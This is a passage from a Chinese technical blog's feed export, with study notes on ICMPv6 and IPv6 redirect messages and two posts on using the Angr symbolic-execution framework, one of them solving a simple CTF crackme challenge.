<li>重定向报文有两种可能的选项，这两个选项是目标链路层地址选项和重定向首部选项。目标链路层地址选项中包含了目标地址的链路层地址。重定向首部选项在整个重定向分组不超过最小链路MTU的前提下，包含了尽可能多的触发重定向的那个原始IPv6分组。</li>
</ol>
<p><img src="http://otc7tld02.bkt.clouddn.com/%E9%87%8D%E5%AE%9A%E5%90%91%E4%BE%8B%E5%AD%90.png" alt=""></p>
<p>如上图所示例子，HostA想与HostB通信，A的默认网关设备为RouterA,当HostA将报文发送给HostB时会被送到RouterA,RouterA接受到报文经过检测后会发现，HostA将报文直接发送给RouterB会更好，于是便发送重定位报文，报文的中指定更好的下一跳地址为RouterB,目标地址为HostB。HostA接收到重定向报文后会在路由表中加上RouterB为主机路由，发送给HostB的报文就直接发送给RouterB而不再经过RouterA。</p>
<p><strong>注</strong>：只有如下情况，设备会向报文发送者发送重定向报文：</p>
<ul>
<li>报文目的地址不是一个组播地址。</li>
<li>报文并非通过路由转发给设备</li>
<li>经过路由计算后，路由的下一跳接口是接受报文的接口。</li>
<li>设备发现报文的最佳下一跳IP地址和报文的源IP地址处于同一网段。</li>
<li>设备检查报文的源地址，发现自身的邻居表项中有用该地址作为全球单播地址或链路本地地址的邻居存在。</li>
</ul>
]]></content>
      
        <categories>
            
            <category> protocol </category>
            
        </categories>
        
        
        <tags>
            
            <tag> IPv6 NDP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ICMPv6学习]]></title>
      <url>/2018/10/17/ICMPv6%E5%AD%A6%E4%B9%A0/</url>
      <content type="html"><![CDATA[<p>ICMPv6（Internet Control Message Protocol for IPv6）<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>IPv6使用的ICMPv6与IPv4使用的ICMPv4类似。定义了基本的ICMPv6的报文。用于错误报告和网络诊断。</p>
<p>与IPv4的ICMP不同的是，ICMPv6提供了很多IPv6协议操作必须的重要函数。例如IPv6一个重要的协议，邻居发现协议就是在ICMPv6上运行的，它执行了大量的功能，比如自动地址配置和链路层地址解析。因此任何支持IPv6的节点都必须完全实现ICMPv6。</p>
<p>与其他高层协议不同，IPv4与6的ICMP完全不同，TCP与UDP的分租格式及算法都是一样的，通过地址翻译机制可使得IPv4与IPv6的通信，但是两者ICMP提供相互操作确实很难的。</p>
<p>本篇将通篇对ICMPv6的基础学习进行记录。</p>
<h2 id="ICMPv6报文"><a href="#ICMPv6报文" class="headerlink" title="ICMPv6报文"></a>ICMPv6报文</h2><p>[RFC2463]定义了四种错误报文和两种信息报文。在分组处理过程中遇到问题时，就可以向源端提供报文，而信息报文则提供一些诊断功能。</p>
<p>4种错误报文是：</p>
<ul>
<li>目标不可达（Destination Unreachable）</li>
<li>分组太长（Packet Too Big）</li>
<li>超时（Time Exceeded）</li>
<li>参数问题（Parameter Problem）</li>
</ul>
<p>2种信息报文是:</p>
<ul>
<li>回送请求（Echo Request）</li>
<li>回送应答（Echo Reply）</li>
</ul>
<p>除了这些之外，还有一些其他的规范，例如邻居发现，节点信息查询，多播监听发现和移动IPv6都定义了一些额外的ICMPv6报文。后面在邻居发现分组都是装载在ICMPv6报文中的。[RFC2461]为ND协议定义了5个这样的ICMPv6报文。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/ICMPv6%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F.png" alt=""></p>
<p>如上图所示，就是通用的ICMPv6的报文格式。IPv6的各种拓展首部都可以放在ICMPv6首部之前。ICMPv6报文中包含以下信息：</p>
<ol>
<li>类型：8比特的类型字段定义ICMPv6的报文类型，可以将ICMPv6报文划分为错误报文或者信息报文。类型0~127用于错误报文，类型128~255用于信息报文。</li>
<li>代码：8比特代码字段的值取决于报文类型，传送了更多与特定报文有关的信息。</li>
<li>校验和：校验和字段装载了伪首部加上整个ICMPv6报文的反码和的16比特反码。</li>
<li>报文主体的长度和内容取决于报文类型。由于ICMPv6首部不包含长度字段，所以ICMPv6报文的长度是从整个分组长度（通常就是IPv6首部的长度字段值）和拓展首部的长度推导出来的。</li>
</ol>
<h3 id="目的不可达报文"><a href="#目的不可达报文" class="headerlink" title="目的不可达报文"></a>目的不可达报文</h3><p>目标不可达报文可能由三个节点产生：分组的源节点、通往分组目的地路径上的中间节点、目的地节点。产生报文即可反映无法传送到分组的各种原因。目的不可达报文格式如下图所示:</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/%E7%9B%AE%E6%A0%87%E4%B8%8D%E5%8F%AF%E8%BE%BE%E6%8A%A5%E6%96%87.png" alt=""></p>
<p>目标不可达报文的类型字段值为1，代码字段可取值为0~4，表示意义如下所示：<br><img src="http://otc7tld02.bkt.clouddn.com/%E7%9B%AE%E6%A0%87%E4%B8%8D%E5%8F%AF%E8%BE%BE%E4%BB%A3%E7%A0%81%E5%AD%97%E6%AE%B5.png" alt=""></p>
<p>发送方将未用字段设定为0，接收方会将其忽略。在不超过最小IPv6MTU(最大传输单元 Maximum Transmission Unit)，报文主题包含了尽可能多的原始分组，存储足够    多的原始分组字节就使得源节点的高层协议能识别出引发ICMPv6错误报文的分组所属的流。</p>
<p>即使某些中间链路由于ICMPv6错误报文太长而将其丢弃了，ICMPv6的错误报文也不会重发，这样就可能错过避免错误的恰当时机，因此限制原始分组的最大长度是很有必要的。即使相应节点知道错误报文目的地的路径MTU长度，但是分片本身也存在缺点，所以也应当避免对分组进行分片。有的原始分组中可能包含一些扩展首部，标识流所必需的分组长度可能很长，所以，又希望尽可能多地存储原始分组。</p>
<p>需要注意的是，IPv4的错误报文存储的内容除了原始分组的IP首部外，只包含净荷的前八个字节，这是因为IPv4中没有可以任意长的扩展首部，这样也就足够了。</p>
<p>当节点的ICMPv6层收到一个目的不可达错误报文的时候，必须通知高层的进程。以采取行动及时避免错误。比如当一个有多台候选服务器的UDP客户应用程序收到端口不可达错误的通知后可即使跟换服务器使用而不是等待超时。</p>
<h3 id="分组太长报文"><a href="#分组太长报文" class="headerlink" title="分组太长报文"></a>分组太长报文</h3><p>当中间节点由于输出链路的MTU小于分组长度而无法转发分组时，就会生成分组太长报文。PMTU(Path MTU)发现记住利用分组太长报文来确定两个端点之间所有路由段的最小链路MTU。这种机制可以帮助传输节点选择正确的分组长度，使得分组可以达到目的地而不会被丢弃。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/%E5%88%86%E7%BB%84%E5%A4%AA%E9%95%BF%E6%8A%A5%E6%96%87.png" alt=""></p>
<p>上图所示就是分组太长报文，其类型字段值为2，代码字段值为0。MTU字段存储了下一跳链路的MTU值，与目标不可达报文一样，在不超过最小IPv6 MTU情况下，报文主体中包含了尽可能多的原始分组。</p>
<p>然后，源节点会按照通知的MTU长度对分组进行分片。节点上的ICMPv6层收到一条分组太长报文时，必须通知高层的进程。这样，高层协议就可以调整TCP片长度以避免分片，从而优化行为。</p>
<p><strong>注</strong>：因为需要通过ICMPv6目的不可达报文来通知PMTU发现机制分组超长，所以建议不要在路由器或者防火墙中滤掉这样的ICMPv6错误报文。以免停止PMTU发现机制的工作，这样有事就会造成通信的中断。</p>
<h3 id="超时报文"><a href="#超时报文" class="headerlink" title="超时报文"></a>超时报文</h3><p>中间路由在响应一个跳数限制字段值为0或者该路由器对跳数限制技术进行了减量操作之后跳数限制变为0的分组时，就生成超时报文。同样的，在超出分组重装时间后也会如此。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/%E8%B6%85%E6%97%B6%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F.png" alt=""></p>
<p><img src="http://otc7tld02.bkt.clouddn.com/%E8%B6%85%E6%97%B6%E6%8A%A5%E6%96%87%E4%BB%A3%E7%A0%81.png" alt=""></p>
<p>上图就是超时报文的格式，报文类型字段为3，代码字段取值为0-1，细节见上。发送方将未用字段设置为0，接收方将其忽略，在不超过最小IPv6MTU情况下，报文主体中包含尽可能多的原始分组，以便为源节点提供线索来确定出错分组。</p>
<h3 id="参数问题报文"><a href="#参数问题报文" class="headerlink" title="参数问题报文"></a>参数问题报文</h3><p>节点处理一个分组且在分组首部遇到一个问题的时候，会丢弃分组，并生成一调参数问题报文。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/%E5%8F%82%E6%95%B0%E9%97%AE%E9%A2%98%E6%8A%A5%E6%96%87.png" alt=""></p>
<p><img src="http://otc7tld02.bkt.clouddn.com/%E5%8F%82%E6%95%B0%E4%BB%A3%E7%A0%81%E5%8F%96%E5%80%BC.png" alt=""></p>
<p>如上图所示就是参数问题报文(类型值为4)以及代码取值细节（取值0-2）<br>指针字段是原始分组中遇到错误的位置的字节偏移量，这个错误随后触发了ICMPv6错误报文。如果由于MTU限制进行了截尾操作，使得错误不在报文主题，则偏移量会执行越过ICMPv6分组末尾的位置。</p>
<p>报文主体中包含尽可能多的原始分组，以便为源节点提供线索来确定出错分组。</p>
<h3 id="回送请求报文"><a href="#回送请求报文" class="headerlink" title="回送请求报文"></a>回送请求报文</h3><p>节点生成回送请求报文主要是为了进行诊断，比如确定一个感兴趣节点的可达性以及往返时延。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/%E5%9B%9E%E9%80%81%E8%AF%B7%E6%B1%82%E6%8A%A5%E6%96%87.png" alt=""></p>
<p>上图就是回送请求报文格式，类型字段位128，源节点生成了标识符和序列号字段的值。这些值可以帮助源节点将回送请求报文和返回的回送应答报文对应起来。数据字段中包含零个或者这多个任意内容的字节。</p>
<h3 id="回送应答报文"><a href="#回送应答报文" class="headerlink" title="回送应答报文"></a>回送应答报文</h3><p>每个IPv6接受到一条请求报文时都必须响应，并产生一条回送应答报文。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/%E5%9B%9E%E9%80%81%E5%BA%94%E7%AD%94%E6%8A%A5%E6%96%87.png" alt=""></p>
<p>如上所示即是回送应答报文格式。类型值为129，代码值为0，标识符和序列号字段以及下面的数据字段都是从接受到的回送请求报文中获得。</p>
<p><strong>注</strong>：与错误报文不同，回送应答1分组可以大于最小MTU长度。因为一些“ping”实现会发送回送请求报文应接受回送应答报文，对数据字段进行“完整性”检测，所以，对数据字段进行截尾是不合适的。</p>
<h2 id="ICMPv6报文处理规则"><a href="#ICMPv6报文处理规则" class="headerlink" title="ICMPv6报文处理规则"></a>ICMPv6报文处理规则</h2><p>产生ICMPv6报文的节点根据下列规则来设置得到的IPv6分组的源地址。</p>
<ul>
<li>如果ICMPv6报文是为了响应一个共目的地是分配给这个节点的单播地址的分组而产生的，就将那个单播地址作为输出ICMPv6报文的源地址。</li>
<li>如果ICMPv6报文是 为了响应一个其目的地址是一个多播组地址、 任播地址或者未分配给这个节点的单播地址的分组而产生的，那么，ICMPv6的源地址就必须是分配给这个节点的单播地址之一。 应该根据源地址选择规则来选择地址。但当所做的选择能为接收报文的节点提供更多信息时，该节点也可以使用其他地址。</li>
<li>除了回送请求报文之外，前面几节讨论的所有其他类型的ICMPv6报文的目的地都是发起ICMPv6报文的分组的源地址。回送请求报文的目的地可以是任意一个有效的IPv6地址。</li>
</ul>
<p>ICMPv6实现在处理或生成ICMPv6分组时，必须注意下列规则。</p>
<ul>
<li>如果ICMPv6层收到了一条未知类型的错误报文或信息报文，必须将分组传送给高层。节点收到一条ICMPv6错误报文或重定向报文时，一定不能生 成ICMPv6错误报文。这条规则可以防止在两个节点间形成ICMPv6错误风暴。</li>
<li>如果原始分组的目的是一一个 多播地址或者分组带有链路层多播或广播地址，节点一定不能产生ICMPv6错误报文。例外的情况是:节点可以生成一条分组太长报文，以及说明逐跳选项或目的选项错误的代码2参数问题报文。即使原始分组的目的是一个多播地址，也可以生成一条分组太 长报文，为多播信道上的PMTU发现提供方便。</li>
<li>如果原始分组的源地址不能唯一地标识一个节点，节点一定不能生成ICMPv6错误报文。这类源地址包括不确定地址，或发送错误报文的节点已知为任播地址的地址。</li>
<li>节点必须限制ICMPv6错误报文的产生速度，以缓和错误报文风暴，比如，当一个远程故障节点不停地发送错误的报文，并忽略ICMPv6错误报文时， 就可能出现这种错误报文风暴。推荐的限速方法是基于令牌桶模型(token bucket model)的，这个模型限制了生成的错误报文的平均数，但仍然允许短期内错误报文的爆发。</li>
</ul>
]]></content>
      
        <categories>
            
            <category> protocol </category>
            
        </categories>
        
        
        <tags>
            
            <tag> IPv6 ICMPv6 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Angr应用]]></title>
      <url>/2018/10/09/Angr%E5%BA%94%E7%94%A8/</url>
      <content type="html"><![CDATA[<p>Angr符号执行<br><a id="more"></a></p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前已经把Angr下的所有方法进行了学习了解，但停留于表面等于没学，需要结合相关的题目进行应用才可以正确掌握。Angr在github的源码中以及提供有一个example的文件夹，里面包含了许多难易不一的比赛题目以及基于Angr的解题脚本。<br><a href="https://github.com/angr/angr-doc" target="_blank" rel="external">链接在这里</a>。</p>
<p>参考：Angr状态选项列表：<a href="https://docs.angr.io/appendix/options" target="_blank" rel="external">https://docs.angr.io/appendix/options</a></p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>这里以一道简单的题目作为例子进行学习：ais3_crackme,在linux下查看可以看到这个程序是一个64位程序</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20181009114143.png" alt=""></p>
<p>我们可以直接把程序脱到64位IDA下进行分析：</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/IDA__%E5%88%86%E6%9E%900.png" alt=""></p>
<p>第一眼看来很简单，只要if中的条件能够达成就可以了，那么重点就在verify。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/IDA_%E5%88%86%E6%9E%901.png" alt=""></p>
<p>程序自带的数据：<br><img src="http://otc7tld02.bkt.clouddn.com/IDA_%E5%88%86%E6%9E%902.png" alt=""><br>就是程序自带的数据与指令行的输入进行处理后的结果进行比较，满足条件即可。</p>
<p>如果没有angr我们可以选择爆破，构造对应条件爆破对位字符即可。脚本如下：</p>
<pre><code>import string
key=[ 0xCA, 0x70, 0x93, 0xC8, 0x06, 0x54, 0xD2, 0xD5, 0xDA, 0x6A,
  0xD1, 0x59, 0xDE, 0x45, 0xF9, 0xB5, 0xA6, 0x87, 0x19, 0xA5,
  0x56, 0x6E, 0x63]


flag=&quot;&quot;
for i in range(len(key)):
    for a1 in string.printable:
            if (((((((ord(a1))&amp;0xff) ^ i) &lt;&lt; ((i ^ 9) &amp; 3))&amp;0xff) | ((((( ord(a1))&amp;0xff) ^ i) &gt;&gt; ((8 - ((i ^ 9) &amp; 3))&amp;0xff))&amp;0xff))+ 8)&amp;0xff==key[i]:
                    flag+=a1
print flag
</code></pre><p>这里可以选择Angr进行解题。<br>想要使用Angr，基本的操作就是先要将程序进行加载：</p>
<pre><code>project = angr.Project(&quot;./ais3_crackme&quot;)
</code></pre><p>上面已经提到，这里是通过命令行获取参数args，所以我们需要claripy库构造一个符号状态，从IDA中不难看出flag的长度为23，所以设置如下：</p>
<pre><code>u = claripy.BVS(&quot;u&quot;,23*8)
</code></pre><p>此时我们需要获取程序的入口状态，并代入参数：</p>
<pre><code>state = project.factory.entry_state(args=[&quot;./ais3_crackme&quot;,u])
</code></pre><p>下面要做的就是构造一个模拟器将程序载入进行等候运行，以找寻正确答案：<br>    sm = project.factory.simulation_manager(state)</p>
<p>下面就是运行程序，但是这里我们可以进行一些小小的设置，这个题目的尽头有两种可能，成功提示，错误提示，或者就是没有思路。emmm，那么在尝试的过程中会触碰到多条路径，探索的过程中的限制我们先不讨论，我们可以设置尽头，我们只想要能够通向成功的路径。</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/find_avoid.png" alt=""></p>
<p>所以我们可以在运行的时候加入如下限制，find后面跟的就是正确结果，avoid就是错误结果:</p>
<pre><code>sm.explore(find=0x400602,avoid=0x40060E)
</code></pre><p>下面使用eval将找到值进行转换得到结果就是flag了(cast_to就是转换的类型，目前只能指出int和str两种)：</p>
<pre><code>solution = found.solver.eval(argv1, cast_to=str)
</code></pre><p>最终跑出结果：</p>
<p><img src="http://otc7tld02.bkt.clouddn.com/result.png" alt=""></p>
<p>脚本在题目所在目录下已经包含，这里就不贴了。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>Angr通俗而言就是爆破，但是在其中包含有许多其他的技术，约束求解、解析程序等。上述题目解答逻辑较为清晰，所以可以自主编写爆破脚本进行解答。但是有的题目设置了比较复杂的算法在其中，这时候编写解题脚本的过程就较为复杂,且不考虑出错的情况。所以Angr可以帮助更快的得到结果。大致的解题过程：</p>
<ol>
<li>对题目进行分析找到正确路径地址，运行中的检验条件，flag长度等一系列信息。</li>
<li>加载程序，设置参数(根据分析得到的flag长度进行设置，也可设置一个大致数值，关乎效率)，获得入口状态(根据需求，添加参数，添加状态选项等)</li>
<li>根据IDA下分析添加约束条件，提高效率。</li>
<li>使用模拟器进行符号执行求解。</li>
<li>获得运算结果。</li>
</ol>
]]></content>
      
        <categories>
            
            <category> binary </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Angr </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Angr学习记录]]></title>
      <url>/2018/09/29/Angr%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      <content type="html"><![CDATA[<p>Angr符号执行</p>
<a id="more"></a>
<p>参考：<a href="http://www.freebuf.com/sectool/143056.html" target="_blank" rel="external">http://www.freebuf.com/sectool/143056.html</a><br><a href="https://github.com/a7vinx/angr-doc-zh_CN/" target="_blank" rel="external">https://github.com/a7vinx/angr-doc-zh_CN/</a></p>
<h1 id="Angr简介"><a href="#Angr简介" class="headerlink" title="Angr简介"></a>Angr简介</h1><h2 id="Angr的含义"><a href="#Angr的含义" class="headerlink" title="Angr的含义"></a>Angr的含义</h2><p>Angr是一个二进制代码分析工具，能够自动化完成二进制文件的分析,执行动态的符号执行(如Mayhem,KIEE等)。众所周知的是，在二进制代码中寻找并且利用漏洞是一项非常具有挑战性的工作，它的挑战性主要在于人工很难直观的看出二进制代码中的数据结构、控制流信息等。Angr的出现便使得这个问题变得易于解决。Angr是一个基于python的二进制漏洞分析框架,对二进制文件分析，并找到漏洞。使得漏洞挖掘的效率进一步得到提高。基于符号执行的fuzz工具driller就结合了Angr和AFL。</p>
<h2 id="Angr的执行"><a href="#Angr的执行" class="headerlink" title="Angr的执行"></a>Angr的执行</h2><ol>
<li>将二进制程序利用CLE装载入Angr的分析系统中</li>
<li>将二进制程序转换为中间语言(Intermediate representation,IR)</li>
<li>将IR转换为语义较强的表达形式，形如这个程序做了什么，并非它是什么。</li>
<li>执行进一步的分析，比如，完整的或者部分静态分析(依赖关系分析，程序块分析)、程序空间的符号执行探索(挖掘漏洞)、一些对于上面方式的结合</li>
</ol>
<h2 id="Angr的安装"><a href="#Angr的安装" class="headerlink" title="Angr的安装"></a>Angr的安装</h2><p>Angr是Python下的一个库，目前只在python2下受到支持，相信python3以后也会支持。所以利用python的方法就可以进行安装了，但是关键在于Angr的依赖需要解决：</p>
<pre><code>sudo apt-get install python-dev libffi-dev build-essential virtualenvwrapper
</code></pre><p>依赖结束后执行如下指令即可完成安装：</p>
<pre><code>mkvirtualenv angr &amp;&amp; pip install angr
</code></pre><h1 id="Angr学习"><a href="#Angr学习" class="headerlink" title="Angr学习"></a>Angr学习</h1><p>嗯，幻想一个场景，一场ctf比赛，我门是选手，点开赛题，一道reverse题提供了一个二进制附件名为r100,ok,开始做题。</p>
<h2 id="Angr之装载模块"><a href="#Angr之装载模块" class="headerlink" title="Angr之装载模块"></a>Angr之装载模块</h2><h3 id="创建对象"><a href="#创建对象" class="headerlink" title="创建对象"></a>创建对象</h3><p>Project意为项目，这里angr的而金子装载组件是CLE，负责将二进制对象及其依赖的库以及易于对其进行操作的方式交给angr的其他组件。Project就是加载二进制文件的方法。就像做pwn题时候我们使用ELF加载题目一样，道理都是一样的。</p>
<pre><code>import angr
p = angr.Project(&apos;./r100&apos;)
</code></pre><h3 id="信息查询"><a href="#信息查询" class="headerlink" title="信息查询"></a>信息查询</h3><p>使用上述方法之后就已经把r100这个二进制文件进行了加载。这时候我们便可以得到很多关于这个二进制文件的信息了。</p>
<blockquote>
<p>p.entry                                   //二进制文件的入口点</p>
<p>p.loader.min_addr()/p.loader.max_addr()    //二进制文件内存空间中的最小地址和最大地址</p>
<p>p.filename                                 //二进制文件的名称，即r100</p>
</blockquote>
<h3 id="程序交互"><a href="#程序交互" class="headerlink" title="程序交互"></a>程序交互</h3><p>loader方法代表了已经装载了的和映射到内存空间中的CLE二进制对象。每一种二进制对象都是由一种可以处理这种文件类型的后端装载器装载，比如ELF就是用以装载ELF文件。</p>
<p>CLE的交互指令如下：</p>
<blockquote>
<p>p.loader                              //一个CLE装载器对象</p>
<p>p.loader.shared_objects               //这是一个字典，包含已经作为二进制文件的一部分而装载的对象(种类取决于后端装载器)</p>
<p>p.loader.memory[b.loader.min_addr()]  //这是装载后的进程的内存空间，它包含具体的地址与对应的值</p>
<p>p.loader.addr_belongs_to_object(b.loader.max_addr()) //返回映射在指定地址的二进制对象。</p>
<p>p.loader.find_symbol_got_entry(‘__libc_start_main’)   //获取二进制文件的got表地址</p>
</blockquote>
<p>与独立的二进制对象交互：</p>
<blockquote>
<p>p.loader.main_bin.deps   //这里获取程序依赖的库名列表，通过读取ELF文件的dynamic section的DT_NEEDED域获取。   <strong>注：dynamic sections下的NEEDED元素保存了以NULL结尾的字符串表的偏移量，这些字符串都是所依赖库的名字。</strong></p>
<p>p.loader.main_bin.memory //这是关于主二进制对象的内存内容的dict</p>
<p>p.loader.shared_objects[‘libc.so.6’].imports //这是一个装载的libc所需的导入条目的dict(name–&gt;ELFRelocation)</p>
<p>p.loader.main_bin.imports 这一个是主二进制对象所需的导入条目的dict(name–&gt;ELFRelocation),地址通常为0.</p>
</blockquote>
<h3 id="装载选项"><a href="#装载选项" class="headerlink" title="装载选项"></a>装载选项</h3><p>CLE工作时会默认地尝试装载二进制文件所需的依赖（比如libc.so.6等），除非装载选项中进行设置auto_load_libs为False。当装载库文件的时候，如果无法找到，装载器会默认忽略产生的错误并且标记所有关于那个库的依赖为已解决的状态。</p>
<p>装载选项传递是以dict形式进行传递。传递给Project后会转传给CLE。如上所示，如果我们想要设置选项为不装载依赖库，则可以使用如下指令：</p>
<pre><code>p=angr.Project(&apos;./r100&apos;,load_options={&quot;auto_load_libs&quot;:Flase})
</code></pre><p>除此以外，其他的装载选项列举如下：</p>
<blockquote>
<p>load_options[‘force_load_libs’] = [‘libleet.so’] //无论是否是目标二进制文件所需要的，强制装载的库的list</p>
<p>load_options[‘skip_libs’] = [‘libc.so.6’] //需要跳过的库的list</p>
<p>load_options[‘main_opts’] = {‘backend’: ‘elf’} //装载主二进制文件时的选项</p>
<p>load_options[‘lib_opts’] = {‘libc.so.6’: {‘custom_base_addr’: 0x13370000}} //映射库名到其装载时需要使用的选项dict的dict</p>
<p>load_options[‘custom_ld_path’] = [‘/etc/libs’] //可以进行额外搜索的路径list</p>
<p>load_options[‘ignore_import_version_numbers’] = False //是否将文件名中版本号不同的库视作相同的，比如libc.so.6和libc.so.0</p>
<p>load_options[‘rebase_granularity’] = 0x1000 //在重定位共享对象的基址的时候需要使用的对齐值</p>
<p>load_options[‘except_missing_libs’] = True //如果找不到一个库，抛出一个异常（默认行为是忽略未找到的库）</p>
</blockquote>
<p>下面两个选项被应用于每一个对象并且覆盖CLE的自动检测。它们可以通过main_opts或者lib_opts来应用。</p>
<blockquote>
<p>load_options[‘main_opts’]={‘custom_base_addr’:0x4000} //装载二进制文件的基址为0x4000</p>
<p>load_options[‘main_opts’]={‘backend’:’elf’} //指定对象的后端装载器(这里指定为elf)</p>
</blockquote>
<p>上面两者可同时设置，如下所示：</p>
<blockquote>
<p>load_options[‘main_opts’]={‘backend’:’elf’,’custom_base_addr’:0x40000}</p>
</blockquote>
<h3 id="后端装载器选项"><a href="#后端装载器选项" class="headerlink" title="后端装载器选项"></a>后端装载器选项</h3><p>CLE集成了ELF,PE，CGC及ELF核心转储文件的后端支持，像IDA一样可以将文件装载。在CLE运作时，会自动检测需要使用的后端，当然如果已经知晓文件的结构信息，也可进行手动指定。关键字backend指定后端，custom_arch关键字指定架构。</p>
<blockquote>
<p>load_options[‘main_opts’] = {‘backend’:’elf’,’custom_arch’:’i386’}</p>
<p>load_options[‘lib_opts’] = {‘libc.so.6’:{‘backend’：’elf’}}</p>
</blockquote>
<table>
<thead>
<tr>
<th>后端关键字</th>
<th style="text-align:center">描述</th>
<th style="text-align:right">是否需要custom_arch</th>
</tr>
</thead>
<tbody>
<tr>
<td>elf</td>
<td style="text-align:center">基于PyELFTools的ELF装载器</td>
<td style="text-align:right">no</td>
</tr>
<tr>
<td>pe</td>
<td style="text-align:center">基于PEFile的PE装载器</td>
<td style="text-align:right">no</td>
</tr>
<tr>
<td>cgc</td>
<td style="text-align:center">Cyber Grand Challenge文件的装载器</td>
<td style="text-align:right">no</td>
</tr>
<tr>
<td>backedcgc</td>
<td style="text-align:center">支持指定内存和寄存器支持CGC文件装载器</td>
<td style="text-align:right">no</td>
</tr>
<tr>
<td>elfcore</td>
<td style="text-align:center">ELF核心转储文件的装载器</td>
<td style="text-align:right">no</td>
</tr>
<tr>
<td>ida</td>
<td style="text-align:center">启动IDA来解析文件</td>
<td style="text-align:right">yes</td>
</tr>
<tr>
<td>blob</td>
<td style="text-align:center">装载文件到内存中作为一个平坦的镜像</td>
<td style="text-align:right">yes</td>
</tr>
</tbody>
</table>
<h2 id="Angr之求解模块"><a href="#Angr之求解模块" class="headerlink" title="Angr之求解模块"></a>Angr之求解模块</h2><p>Angr的魅力不在于它是一个模拟器，而是符号执行功能。当它拥有一个符号而并非一个变量或是一个定值。对这个符号进行一系列的算术运算，所有运算整合成为一个操作树,称之为抽象语法树（AST）。同时AST可在后面转换为SMT求解器的约束。比如说python下的另一个库z3，已知操作序列的输出，求输入的值。</p>
<p>继续假设r100程序所需的输入是来自指令行，我们装载r100之后，就可以就这个值进行构造。<br>开头三部曲：</p>
<pre><code>import angr, monkeyhex
proj = angr.Project(&apos;./r100&apos;)
state = proj.factory.entry_state()
</code></pre><h3 id="BVV"><a href="#BVV" class="headerlink" title="BVV"></a>BVV</h3><p>Bitvertor是一个位序列，用算术的有界整数进行语义解释，它的缩写就是BV了。</p>
<p>BVV的作用则是定义一个指定的value，如下所示指定64位的1与100以及27位的9：</p>
<pre><code>one = state.solver.BVV(1,64)        //output of one:&lt;BV64 0x1&gt;
hundred = state.solver.BVV(100,64) //output of hundred:&lt;BV64 0x64&gt;
new_nine = state.solver.BVV(9,27) //output of new_nine:&lt;BV27 0x9&gt;
</code></pre><p>既然这里指定的是value，又是有界的整数，那么相同位的值自然是可以进行算法操作的：</p>
<pre><code>one + hundred ：&lt;BV64 0x65&gt;
hundred + 0x21: &lt;BV64 0x85&gt;
hundere - one*200 :&lt;BV64 0xFFFFFFFFFFFFFF9C&gt;
</code></pre><p>不同位的值如果想要进行操作，则必须将低位数的值进行拓展到与高位值一致才可,有两种方法：</p>
<ol>
<li>zero_extend:使用给定的数量的零在左侧填充位向量。</li>
<li>sign_extend:与上者相反，填充高位。</li>
</ol>
<p>这里想要把27位的值与64位的值进行操作的话，则需要将27位拓展填充到64位：</p>
<pre><code>new_nine.zero_extend(64-27)       //output:&lt;BV64 0x9&gt;
one + new_nine.zero_extend(64-27) //output:&lt;BV64 0xA&gt;
</code></pre><h3 id="BVS"><a href="#BVS" class="headerlink" title="BVS"></a>BVS</h3><p>BVS的作用则是定义一个符号symbol，如下所示指定64位下的符号x与y:</p>
<pre><code>x=state.solver.BVS(&quot;x&quot;,64) //output:&lt;BV64 x_0_64&gt;
y=state.solver.BVS(&quot;y&quot;,64) //output:&lt;BV64 y_1_64&gt;
</code></pre><p>这里可以看到输出的x,y符号都被命名了，我们可以看出来，X_X_X,第一个表示符号名称，第二个是符号排序位置，第三个则是符号的位数。</p>
<p>不论是x还是y现在都是符号性的变量了，但是依旧是可以进行算数运算的，得到的不是一个数字，而是一个AST。</p>
<pre><code>x + one          //&lt;BV64 x_0_64 + 0x1&gt;
(x + one) / 2    //&lt;BV64 (x_0_64 + 0x1) / 0x2&gt;
x - y             //&lt;BV64 x_1_64 - y_1_64&gt;
</code></pre><h3 id="AST"><a href="#AST" class="headerlink" title="AST"></a>AST</h3><p>这里的x,y,one。只要是bitvector都是一个AST，即使操作只有1层。那么AST如何处理？</p>
<p>每一个AST都有一个.op和.args。通俗的来说，op就是指出两个符号或值在做些什么，输出是一个字符串。args则是执行操作时候的输入。</p>
<pre><code>tree = (x + 1) / (y + 2)  //output of tree:&lt;BV64 (x_0_64 + 0x1) / (y_1_64 + 0x2)&gt;
tree.op                   //&apos;__div__&apos;
tree.args                  //(&lt;BV64 x_0_64 + 0x1&gt;, &lt;BV64 y_1_64 + 0x2&gt;)
tree.args[0].op              //&apos;__add__&apos;
tree.args[0].args          //(&lt;BV64 x_0_64&gt;, &lt;BV64 0x1&gt;)
tree.args[0].args[1].op   //&apos;BVV&apos;
tree.args[0].args[1].args //(1, 64)
</code></pre><h3 id="符号约束"><a href="#符号约束" class="headerlink" title="符号约束"></a>符号约束</h3><p>如果将两个类型相似的AST进行比较操作依然会产生一个AST而非bitvector，而是符号布尔类型值。</p>
<pre><code>x == 1                     //&lt;Bool x_0_64 == 0x1&gt;
x == one                   //&lt;Bool x_0_64 == 0x1&gt;
x &gt; 2                      //&lt;Bool x_0_64 &gt; 0x2&gt;
x + y == hundred + 5       //&lt;Bool (x_0_64 + y_1_64) == 0x69&gt;
